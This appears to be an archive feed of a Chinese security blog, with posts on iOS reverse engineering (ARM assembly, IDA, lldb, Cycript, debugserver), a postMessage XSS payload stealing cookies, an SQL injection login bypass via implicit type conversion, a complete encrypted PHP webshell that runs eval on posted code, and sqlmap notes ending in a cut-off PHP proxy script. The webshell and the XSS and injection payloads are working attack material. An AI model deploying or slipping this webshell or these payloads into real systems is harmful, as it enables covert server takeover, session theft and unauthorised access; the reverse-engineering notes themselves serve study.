&#x2F;&#x2F;将COUNT这个变量的地址，也就是0x40003100放到R1中MOV R0,#0           &#x2F;&#x2F;将立即数0放到R0中STR R0,[R1]         &#x2F;&#x2F;将R0中的值放到以R1中的值为地址的存储单元去B 跳转指令BL 带返回的跳转指令BLX 带返回和状态切换的跳转指令BX  带状态切换的跳转指令BLX指令从ARM指令集跳转到指令中所指定的目标地址，并将处理器的工作状态从ARM切换到Thumb状态，该指令同时将PC的当前内容保存到寄存器R14，因此，当子程序使用Thumb指令集，而调用者者使用ARM指令集，可以通过BLX指令实现子程序的调用和处理器工作状态切换，同时，子程序的返回可以通过将寄存器R14的值复制到PC中来完成。　R0-R3:　　　　　　　　用于函数参数及返回值的传递，超过4个参数，其它参数存在栈中，在ARM中栈是向下生长的，R0还可以作为返回值。　　R4-R6, R8, R10-R11:　没有特殊规定，就是普通的通用寄存器　　R7:　　　　　　　　　　栈帧指针，指向母函数与被调用子函数在栈中的交界。　　R9:　　　　　　　　　　在iOS3.0被操作系统保留　　R12:　　　　　　　　　 内部过程调用寄存器，动态链接时会用到，不必深究　　R13:　　　　　　　　　 SP(stack pointer)，是栈顶指针　　R14:　　　　　　　　　 LR(link register)，存放函数的返回地址。　　R15:　　　　　　　　　 PC(program counter)，指向当前指令地址。ADC 　　 带进位的加法　　ADD 　　 加法　　AND 　　 逻辑与　　B 　　　  分支跳转，很少单独使用　　BL          分支跳转，跳转后返回地址存入r14　　BX          分支跳转，并切换指令模式（Thumb&#x2F;ARM）　　CMP        比较值，结果存在程序状态寄存器，一般用于分支判断　　BEQ        结果为0则跳转　　BNE        结果不为0跳转　　LDR        加载寄存器，从内存加载到寄存器　　LDRB      装载字节到寄存器　　LDRH      装载半字到寄存器（一个字是32位）　　LSL         逻辑左移 这是一个选项，不是指令　　LSR         逻辑右移 这是一个选项，不是指令　　MOV        传送值&#x2F;寄存器到一个寄存器 　　STR         存储一个寄存器，寄存器值存到内存　　STRB       存储一个字节　　STRH       存储一个半字　　SUB         减法　　PUSH POP 堆栈操作有时候需要db  ；定义字节类型变量，一个字节数据占一个字节单元，读完一个偏移量加1dw  ；定义字类型变量，一个字数据占2个字节单元，读完一个，偏移量加2dd  ；定义双字类型变量，一个双字数据占4个字节单元，读完一个，偏移量加4IDA给某个位置命名的时，它会使用该位置的虚拟地址和表示一个该地址的类型的前缀进行命名：sub_xxx  ；地址xxx处的子例程loc_xxx  ；地址xxx处的一个指令byte_xxx ；位置xxx处的8位数据word_xxx ;位置xxx处的16位数据dword_xxx ;位置xxx处的32位数据unk_xxx   ;位置xxx处大小未知的数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关于sp，bp等栈寄存器的解释：</p><pre class="line-numbers language-none"><code class="language-none">SP is stack pointer. The stack is generally used to hold &quot;automatic&quot; variables and context&#x2F;parameters across function calls. Conceptually you can think of the &quot;stack&quot; as a place where you &quot;pile&quot; your data. You keep &quot;stacking&quot; one piece of data over the other and the stack pointer tells you how &quot;high&quot; your &quot;stack&quot; of data is. You can remove data from the &quot;top&quot; of the &quot;stack&quot; and make it shorter.&lt;https:&#x2F;&#x2F;www.zybuluo.com&#x2F;oro-oro&#x2F;note&#x2F;137244&gt;&lt;http:&#x2F;&#x2F;cryptroix.com&#x2F;2016&#x2F;10&#x2F;16&#x2F;journey-to-the-stack&#x2F;&gt;&lt;http:&#x2F;&#x2F;en.citizendium.org&#x2F;wiki&#x2F;Stack_frame&gt;虽然是英文，但是看起来要比中文易懂<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ida里面有三种颜色的箭头:</p><ol><li>蓝色，顺序执行</li><li>绿色，条件为(YES)</li><li>红色，条件为（NO）</li></ol><h2 id="0x03-lldb使用方法"><a href="#0x03-lldb使用方法" class="headerlink" title="0x03 lldb使用方法"></a>0x03 lldb使用方法</h2><pre class="line-numbers language-none"><code class="language-none">lldb操作相关指令image list -o -f 查看进程在虚拟内存中相对模块基地址br s -a [addr]  打断点breakpoint delete &lt;breakpoint&gt; 删除断点s&#x2F;n  是针对源代码br list 列出所有断点br dis 1  禁用序号为1的断点jump &lt;address&gt; 跳转到新地址ni   断点的单步之行, netxi(next instruction简写:ni)si   stepi(step instruction 简写:si)display &#x2F;10i $pc-16  显示当前PC附近的10条指令si会进入函数之行，ni执行完但是不会进入函数内，执行过程中可以利用display &#x2F;i $pc来看下一个执行的instruction是什么c  放开执行该断点p  输出某个寄存器的值p $r0  输出寄存器的内容也可以将一个地址所存放的值进行打印p&#x2F;x $sp 就是输出$sp指针所指的地址处存放的值，以16进制表示po (char *)$r2   po打印Object-C对象register read --all  读取所有的寄存器内容thread list ／／打印所有线程thread select  ／／跳到某个线程thread info ／／输出当前线程信息frame variable  ／／打印当前栈所有变量frame variable &#39;变量名&#39; ／／打印某个变量frame info 查看当前帧栈信息frame select 跳到指定帧栈<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://images2015.cnblogs.com/blog/545446/201608/545446-20160803092245918-95608722.png"><br><img src="https://images2015.cnblogs.com/blog/545446/201608/545446-20160803092702793-231598231.png"></p><p>frida的常见用法：</p><ul><li>hook函数(IOS中theos具备的功能）</li><li>记录函数执行日至(IOS中theos具备的功能）</li><li>调用函数（IOS中cycript具备的功能）</li><li>读写内存（类似调试器的功能）</li></ul><p>lldb:</p><ul><li>lldb在object-c类对象所有函数设置断点: <code>breakpoint set -r &#39;\[ClassName .*\]$&#39;</code></li></ul><p>常用：</p><pre class="line-numbers language-none"><code class="language-none">breakpoint set --name &lt;method-name&gt;    &quot;set a breakpoint on a given function name, globally. eg.     breakpoint set --name viewDidLoad     or     breakpoint set --name &quot;-[UIView setFrame:]&quot;     break set --selector &lt;selector-name&gt;    &quot;set a breakpoint on a selector, globally. e.g.,    breakpoint set --selector deallocbt  &#x2F;&#x2F;查看堆栈frame select &lt;framenum&gt;thread list expression $r6 &#x2F;&#x2F;查看r6寄存器的值1. 加参数可以更改显示方式，如&#x2F;x十六进制打印2. po一般用作查看对象信息3. po的命令是“expression -O -&quot;命令的别名第一次使用malloc_info需要在lld里面导入lldb.macosx.heapmalloc_info -s &lt;address&gt;memory read &lt;start_address&gt; &lt;end_address&gt; 读取内存的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x04-Hopper基本使用"><a href="#0x04-Hopper基本使用" class="headerlink" title="0x04 Hopper基本使用"></a>0x04 Hopper基本使用</h2><p>hopper和LLDB所选择的ARM架构位数得一致，要么是32位，要么都是64位，计算公式：<br>hopper里面显示的都是”模块偏移前基地址”,而lldb要操作的都是”模块偏移后的基地址”，所以从hopper到lldb要做一个地址偏移量的转换。</p><pre class="line-numbers language-none"><code class="language-none">偏移后模块基地址 ＝  偏移前模块地址 + ALSR<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>偏移前地址从Hopper看:</p><p><img src="https://upload-images.jianshu.io/upload_images/1584204-69b7b8c603bc3d25.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700"></p><p>ALSR偏移地址从LLDB看:</p><p><img src="https://upload-images.jianshu.io/upload_images/1584204-3140f0b7d73ad6b2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700"></p><p>由上图可知ASLR偏移：30000<br>偏移后基地址为：34000</p><p>(从hopper的login搜索找到方法［WCAccountPhoneLoginControlLogic initWithData:]：<br>查看偏移基地址：<br><img src="https://upload-images.jianshu.io/upload_images/1584204-b0503afcf07798ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700"><br>则偏移后的地址： 14B6A66 + 30000 = 14E6A66<br>设置断点动态调试，使用：</p><pre class="line-numbers language-none"><code class="language-none">br s -a 0x 14E6A66<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x05-Cycript"><a href="#0x05-Cycript" class="headerlink" title="0x05 Cycript"></a>0x05 Cycript</h3><p>安装Cycript</p><pre class="line-numbers language-none"><code class="language-none">dpkg -i cycript_0.9.461_iphoneos-arm.deb  dpkg -i libffi_1-3.0.10-5_iphoneos-arm.deb cycript -p &lt;pid&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>步骤：</p><p>安装cydia之后的ssh，然后mac本机：</p><pre class="line-numbers language-none"><code class="language-none">brew install usbmuxd iproxy 2222 22   &#x2F;&#x2F;iphone的22端口转发到本机的2222ssh root@localhost -p 2222  &#x2F;&#x2F;默认密码 alpine<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">cycript:[UIApp description][[UIApp keyWindow] recursiveDescription].toString() &#x2F;&#x2F;输出如下&lt;UIView: 0x18b1bd60; frame &#x3D; (10 0; 20 50); layer &#x3D; &lt;CALayer: 0x18b1be20&gt;&gt;   |    |    |    |    |    |    |    |    | &lt;UIImageView: 0x18b1bf90; frame &#x3D; (30 13.5; 10 10); opaque &#x3D; NO; userInteractionEnabled &#x3D; NO; layer &#x3D; &lt;CALayer: 0x18b1b5f0&gt;&gt;   |    |    |    |    |    |    |    |    | &lt;UITableViewLabel: 0x18b1c070; frame &#x3D; (44 10; 218 17); text &#x3D; &#39;UIView&#39;; userInteractionEnabled &#x3D; NO; layer &#x3D; &lt;_UILabelLayer: 0x18b1c190&gt;&gt;&#x2F;&#x2F;查看某个UI：[#0x18b1c070 _ivarDescription].toString()[#0x15baf520 nextResponder] 某个地址的调用方法[[UIApp keyWindow] _autolayoutTrace].toString()&#x2F;&#x2F;choose传递一个类，可以在内存中找出属于这个类的对象／／输出对象的属性：方法1： 简单基本获取方法。*controller（直接在对象前面加个*）方法2：方法一无法获取，就使用方法2[i for (i in *UIApp)]方法3：建议方法三，方法三能获取到更多function tryPrintIvars(a)&#123; var x&#x3D;&#123;&#125;; for(i in *a)&#123; try&#123; x[i] &#x3D; (*a)[i]; &#125; catch(e)&#123;&#125; &#125; return x; &#125;function printMethods(className, isa) &#123;  var count &#x3D; new new Type(&quot;I&quot;);  var classObj &#x3D; (isa !&#x3D; undefined) ? objc_getClass(className)-&gt;isa : objc_getClass(className);  var methods &#x3D; class_copyMethodList(classObj, count);  var methodsArray &#x3D; [];  for(var i &#x3D; 0; i &lt; *count; i++) &#123;    var method &#x3D; methods[i];    methodsArray.push(&#123;selector:method_getName(method), implementation:method_getImplementation(method)&#125;);  &#125;  free(methods);  return methodsArray;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">cycript -p Springboard 或 cycript -p pid#在内存中找一个MD5Signater类的实例对象choose(MD5Signater)#调用0x166b4fb0处的对象的show函数［#0x166b4fb0 show]#对show函数传入参数3344[#0x166b4fb0 show:3344]#新建一个MD5Signater类的实例，并调用它的setSecret函数，传入参数1obj &#x3D; [MD5Signater alloc][#0x146f1a30 setSecret:1]在Objective-C中，［someObject somemethod]的底层实现，实际上是objc_msgSend（someObject,someMethod）,其中前一个是Objective-C对象，后者则可以强制转换成一个字符串。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x06-调试流程"><a href="#0x06-调试流程" class="headerlink" title="0x06 调试流程"></a>0x06 调试流程</h3><p>如果要使用lldb调试越狱设备上的进程，需要先将connect的端口映射到本地，以1234端口为例：</p><pre class="line-numbers language-none"><code class="language-none">iproxy 1234 1234然后打开lldb，输入以下命令：process connect connect:&#x2F;&#x2F;localhost:1234连接越狱设备，输入：debugserver *:1234 -a &lt;pid&gt;只要越狱设备上的debugserver（重签名过的）正常运行，就可以通过lldb进行远程调试<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>越狱设备第一次连接xcode的时候会在/Developer/usr/bin目录下生成一个debugserver，这个debugserver在ios里面运行会失败需要使用ldid签名，需要两个东西：</p><ul><li><p>ldid   <a href="http://7xibfi.com1.z0.glb.clouddn.com/uploads/default/668/c134605bb19a433f.xml">http://7xibfi.com1.z0.glb.clouddn.com/uploads/default/668/c134605bb19a433f.xml</a></p></li><li><p>xml（文件） <a href="http://joedj.net/ldid">http://joedj.net/ldid</a></p></li></ul><p> xml文件保存为<code>ent.xml</code>，然后签名：</p> <pre class="line-numbers language-none"><code class="language-none">ldid -Sent.xml debugserver<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 然后回传到ios上面即可，使用wget或者scp（scp失败，这里是用的是wget）</p> <pre class="line-numbers language-none"><code class="language-none">debugserver 0.0.0.0:1234 &quot;SpringBoard&quot;(lldb)process connect connect:&#x2F;&#x2F;&lt;ios&gt;:&lt;port&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Object-C-的一些基础知识"><a href="#Object-C-的一些基础知识" class="headerlink" title="Object-C 的一些基础知识"></a>Object-C 的一些基础知识</h3><p>在Objective-C中的“方法调用”其实应该叫做消息传递。<br>以objc_msgSend函数为例子，</p><pre class="line-numbers language-none"><code class="language-none">[person sayHello] 可以解释为调用person对象的sayHello方法，但是如果从Object-C的Runtime角度来说，这个代码世纪是在发送一个消息，这个代码，编译器时机会将它转换成这样一个函数调用：objc_msgSend(person,@selector(sayHello))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>第一个参数是要发送消息的实例，也就是person对象。objc_msgSend会先查询它的methodList方法列表，使用第二个参数sayHello</p><pre class="line-numbers language-none"><code class="language-none">苹果文档这样写的id objc_msgSend(id self, SEL _cmd, ...)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>将一个消息发送给一个对象，并且返回一个值。其中，self是消息的接受者，<code>_cmd</code>是selector，… 是可变参数列表。</p><p>在现代操作系统中，一个线程会被分配一个stack，当一个函数被调用，一个stack frame（帧栈)就会被压到stack里，里面包含这个函数设计的参数，局部变量，返回地址等相关信息。当函数返回这个帧栈之后，这个帧栈就会被销毁。</p><pre class="line-numbers language-none"><code class="language-none">- (double)pi;  方法名就是pi- (int)square:(int)num; 带参数的方法名有点特殊，冒号后面一定是参数，可以理解为，有几个冒号就有几个参数，把空格后面到参数前面的内容拼起来就是方法名。所以这个方法名是square:（注意冒号）－ (int)addNum1:(int)num1 addNum2:(int)num2;  根据上面的方法，这个方法名是addNum1:addNum2:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以根据上面方法名的问题，在cycript里面调用的时候，是这样：</p><pre class="line-numbers language-none"><code class="language-none">cy# choose(PARSEPedometerInfo) [#&quot;PARSPedometerInfo&lt;0x12f22cd60&gt;: \n integration&#x3D;1541 \n iPhone&#x3D;1541 \n watch&#x3D;0 \n heartRat&#x3D;0\n at:2017-12-26 16:00:00 +0000&quot;,#&quot;PARSPedometerInfo&lt;0x12f406c90&gt;: \n integration&#x3D;1541 \n iPhone&#x3D;1541 \n watch&#x3D;0 \n heartRat&#x3D;0\n at:2017-12-26 16:00:00 +0000&quot;]    也即找到两个PARSPedometerInfo类的对象,随便用其中一个即可[#0x12f22cd60 setIntegratedSteps:66666] setIntegratedSteps是减号开头的函数，如果是+号开头的函数用法则[className funcName:6666]，如下面的函数是+号开头的函数，可以直接调用这个类中的函数，而不用创建这个类的实例：cy# [PARSCryptDataUtils encryptWithServerTimestamp:&quot;18013790233&quot;]带减号的函数，要实例化之后才可以调用带加号的函数，可以直接调用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">_text:0001D76A MOV R0, #(selRefHTTPMethod - 0x1C776) ; selRef_HTTPMethod_text:0001D772 ADD R0, PC ; selRefHTTPMethod__text:0001D774 LDR R1, [R0] ; &quot;HTTPMethod&quot;__text:0001D776 MOV R0, R10_text:0001D778 STR R1, [SP,#0xAC+varA0]_text:0001D77A BLX _objcmsgSend__text:0001D77E MOV R7, R7_text:0001D780 BLX _objcretainAutoreleasedReturnValue__text:0001D784 MOV R4, R0_text:0001D786 MOV R0, #(selRefsetRequestMethod_ - 0x1C794) ; selRef_setRequestMethod___text:0001D78E MOV R2, R4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>0001D77A处的selector为HTTPMethod，在functions windows里可以搜到这个函数，函数在执行前把调用的对象存储在R0中。</p><pre class="line-numbers language-none"><code class="language-none">__text:0001D774 LDR R1, [R0] ; &quot;HTTPMethod&quot;   ／／把方法名放到R1中__text:0001D776 MOV R0, R10                    &#x2F;&#x2F;R0赋值为R10所在的值，此处R10位HTTPMethod这个方法归属的类的指针之类。上面两条指令确定了调用的函数，调用完方法，如果一个方法有返回值，会更新在R0，大于一个返回值，就会通过栈来返回值。（意思是如果函数不止一个返回值，就会通过栈来返回）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">NSString *string1 &#x3D; @&quot;test 1&quot;;NSString *string2 &#x3D; @&quot;test 2&quot;;(lldb) po string1test 1(lldb) p string1(NSString *) $2 &#x3D; 0x0000000100003af0 @&quot;test 1&quot;(lldb) p string2(NSString *) $3 &#x3D; 0x0000000100003b10 @&quot;test 2&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><a href="https://objccn.io/issue-19-2/">https://objccn.io/issue-19-2/</a></li><li><a href="https://www.zybuluo.com/qidiandasheng/note/349994">https://www.zybuluo.com/qidiandasheng/note/349994</a></li><li><a href="https://www.jianshu.com/p/13e5774759a2">https://www.jianshu.com/p/13e5774759a2</a></li><li><a href="http://bbs.iosre.com/t/ida--objc-msgsend/166">http://bbs.iosre.com/t/ida--objc-msgsend/166</a></li><li><a href="http://cryptroix.com/2016/10/16/journey-to-the-stack/">http://cryptroix.com/2016/10/16/journey-to-the-stack/</a></li><li><a href="http://en.citizendium.org/wiki/Stack_frame">http://en.citizendium.org/wiki/Stack_frame</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>n0js case3</title>
      <link href="/2017/01/07/n0js-case-postMessage-xss.html"/>
      <url>/2017/01/07/n0js-case-postMessage-xss.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://community.hpe.com/t5/Protect-Your-Assets/XSS-and-App-Security-through-HTML5-s-PostMessage/ba-p/6515002">https://community.hpe.com/t5/Protect-Your-Assets/XSS-and-App-Security-through-HTML5-s-PostMessage/ba-p/6515002</a></li><li><a href="http://server.n0tr00t.com/n0js/case3.php">http://server.n0tr00t.com/n0js/case3.php</a></li><li><a href="https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html">https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html</a></li></ul><p>在不同网页之间使用postMessage交流信息的时候，存在xss的情况，上面第二个链接是问题，第一个和第三个是对应的解决方法，最后的payload就是如下：</p><p>简单来说，如果A存在xss，B使用postMessage接收来自A的信息，那么在A站可以加载B的iframe，弹出B的cookie。所以这种情况下，A，B都是存在Xss漏洞的。</p><pre class="line-numbers language-none"><code class="language-none">var t &#x3D; document.createElement(&quot;iframe&quot;);t.setAttribute(&quot;src&quot;,&quot;https:&#x2F;&#x2F;www.n0tr00t.com&#x2F;static&#x2F;test&#x2F;helloevent.html&quot;);&#x2F;&#x2F;t.setAttribute(&quot;onload&quot;,&quot;frames[0].postMessage(&#39;&lt;input onfocus&#x3D;alert(document.cookie) autofocus&gt;&#39;,&#39;*&#39;)&quot;);document.body.appendChild(t);function a()&#123;var b &#x3D; document.createElement(&quot;button&quot;);b.setAttribute(&quot;onclick&quot;,&quot;frames[0].postMessage(&#39;&lt;img src&#x3D;x onerror&#x3D;alert(document.cookie)&gt;&#39;,&#39;*&#39;)&quot;);&#x2F;&#x2F;b.setAttribute(&quot;onclick&quot;,&quot;frames[0].postMessage(&#39;this is onerror img src&#39;,&#39;*&#39;)&quot;);document.body.appendChild(b);b.click();&#125;&#x2F;&#x2F;setTimeout(&quot;a()&quot;,3000);window.onload &#x3D; a();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Fun </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL隐形弱类型转换绕过</title>
      <link href="/2017/01/05/SQL%E9%9A%90%E5%BD%A2%E8%BD%AC%E6%8D%A2%E7%BB%95%E8%BF%87waf.html"/>
      <url>/2017/01/05/SQL%E9%9A%90%E5%BD%A2%E8%BD%AC%E6%8D%A2%E7%BB%95%E8%BF%87waf.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://tom.vg/2013/04/mysql-implicit-type-conversion/">https://tom.vg/2013/04/mysql-implicit-type-conversion/</a><br><a href="https://www.t00ls.net/articles-24308.html">https://www.t00ls.net/articles-24308.html</a></p><p>如果PHP语句中存在这样的登录漏洞比如：</p><p><code>$sql=&quot;select * from users where id=&#39;&quot;.$user.&quot;&#39; and password=&#39;&quot;.md5($pass).&quot;&#39;;</code></p><p>但是在登录框处限制了用户名长度</p><pre class="line-numbers language-none"><code class="language-none">if (strlen($user)&gt;4)&#123;print &quot;用户名不能超过4个字符串&quot;;echo $user;echo strlen($user);die();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果未做限制的情况下可以构造这样的语句<br><code>select * from users where userid = 1 or 1=1</code></p><p>在限制的情况下可以利用sql隐形转换这样子：<br><code>select * from users where userid=&#39;&#39;=0#</code></p><p>这个就全部选择出来了，然后重要的点在后面<code>userid=&#39;&#39;=0#</code>，闭合前面单引号，于是整个数值就恒等于了，也可以这么写</p><p><code>userid=&#39;&#39;=false#</code>,<code>userid=&#39;&#39;=(1-1)</code>,<code>userid=&#39;a&#39;=0</code></p><p>基本原理就是上面文章提到的：</p><p>算数操作符<code>+</code>会将字符型的user转换为数值型的user，<br><code>dah</code>,<code>tagi</code>,<code>admin</code>对应的数值是0，<br><code>1232dfs</code>，<code>123idu</code>对应的数值是123。</p><p>除去<code>+</code>号，其他操作符也会发生类型转换比如<code>MOD,DIV,*,/,%, -</code></p>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>加密webshell流量</title>
      <link href="/2017/01/04/%E5%8A%A0%E5%AF%86webshell%E6%B5%81%E9%87%8F.html"/>
      <url>/2017/01/04/%E5%8A%A0%E5%AF%86webshell%E6%B5%81%E9%87%8F.html</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">&lt;?phpfunction easy_en($str) &#123;    $ret &#x3D; &quot;&quot;;    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;        $old &#x3D; ord($str[$i]);        if ($old &#x3D;&#x3D; 0) $new &#x3D; 0x7f;        else $new &#x3D; $old -1;        $ret .&#x3D; chr($new);    &#125;    return $ret;&#125;function easy_de($str) &#123;    $ret &#x3D; &quot;&quot;;    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;        $old &#x3D; ord($str[$i]);        if ($old &#x3D;&#x3D; 0x7f) $new &#x3D; 0;        else $new &#x3D; $old + 1;        $ret .&#x3D; chr($new);    &#125;    return $ret;&#125;if (@$_GET[&#39;role&#39;] &#x3D;&#x3D; &#39;proxy&#39; &amp;&amp; @$_GET[&#39;url&#39;]) &#123;    $c &#x3D; base64_encode(easy_en(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));&#x2F;&#x2F;    var_dump($c);    $cxt &#x3D; stream_context_create(array(&#39;http&#39;&#x3D;&gt;array(        &#39;header&#39;&#x3D;&gt;&#39;Content-Type: application&#x2F;x-www-form-urlencoded&#39;,        &#39;method&#39;&#x3D;&gt;&#39;POST&#39;,        &#39;content&#39;&#x3D;&gt;$c),    ));    $c &#x3D; file_get_contents($_GET[&#39;url&#39;], false, $cxt);&#x2F;&#x2F;    var_dump($c);    die(easy_de(base64_decode($c)));&#125;function shutdown() &#123;    $str &#x3D; ob_get_contents();    ob_end_clean();    echo base64_encode(easy_en($str));&#125;register_shutdown_function(&quot;shutdown&quot;);ob_start();$c &#x3D; easy_de(base64_decode(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));parse_str($c, $_POST); &#x2F;&#x2F;解密之后把pass赋值给$_POST参数eval($_POST[&#39;pass&#39;]);  &#x2F;&#x2F;执行一句话?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Sqlmap备忘录</title>
      <link href="/2017/01/03/sql%E4%B8%AD%E8%BD%AC.html"/>
      <url>/2017/01/03/sql%E4%B8%AD%E8%BD%AC.html</url>
      
        <content type="html"><![CDATA[<p>2017-1-11更新：<br>原来的时候下面这一坨代码用了半个小时写出来，PHP比较渣，变查边写边用burp调试。</p><p>其实需求很简单，就是在sqlmap的每个payload后面写入特定字符，昨天的时候看到这篇文章才发现sqlmap已经有选项了，感觉自己蠢蠢嗒- -</p><p><a href="http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html">http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html</a></p><blockquote><p>The prefix (–prefix) and suffix (–suffix) options configure the strings that should be included with each SQL injection payload in order to begin, and then terminate, the Injection. </p></blockquote><pre class="line-numbers language-none"><code class="language-none">--prefix --suffix 是每次添加在payload的数据，一个前置，一个后置<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>###在注入测试的时候union查询用的是NULL?</p><blockquote><p>Why use NULL values in the UNION SELECT? NULL is a great value to use in UNIONS when trying to determine the correct number of columns in an injection, as it can sit in place of a number of different field types, such as numbers, strings and dates.</p></blockquote><p>###使用具体的payload<br>如果知道了注入点是在order by，可以添加这样的选项:<code>--test-filter=&#39;ORDER BY&#39;</code></p><p>###<code>--string</code> &amp; <code>--not-string</code><br>Blind injection的时候，有这样的选项：</p><pre class="line-numbers language-none"><code class="language-none">--string--not-string在true或者false要判断的字符--regexp 使用的正则表达--code 根据HTTP状态来判断--text-only 比较回应的文本--title 比较回应的title其中作者说明了使用--string或者--not-string的时候可以使用Python里面的十六进制换行来匹配比如newline(\x0a)和tabs(\x09)--string&#x3D;&quot;Name\x0a\x09\x09Stephen&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>###自动选择Y<br>注入的时候sqlmap会询问是Y或者N之类的，有这么一个选择可以：</p><p><code>--answers=&#39;optimize=Y&#39;</code></p><p>另外一个是<code>--flush-session</code>刷新注入的session</p><p>最后一段是作者的经验，往往这个最重要，OK。下一集作者会写几个例子，关注下。</p><hr><hr><p>不晓得能不能成，就记录东西啦，不管是菜刀还是sqlmap，走的流量都是http协议，<br>最后判断的依据都是http页面上的内容。</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpset_time_limit(0);$host &#x3D; &quot;&quot;;$useragent&#x3D;&quot;Mozilla&#x2F;4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;;$data&#x3D;$_POST;$u &#x3D; $_POST[&quot;username&quot;];$u &#x3D; $u.&quot; # between&quot;;$re &#x3D; array(&quot;username&quot; &#x3D;&gt; $u);$pack &#x3D; array_replace($data,$re);$ch &#x3D; curl_init();curl_setopt($ch,CURLOPT_URL,$host);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_POST, 1);curl_setopt($ch,CURLOPT_POSTFIELDS, $pack);curl_setopt($ch,CURLOPT_TIMEOUT, 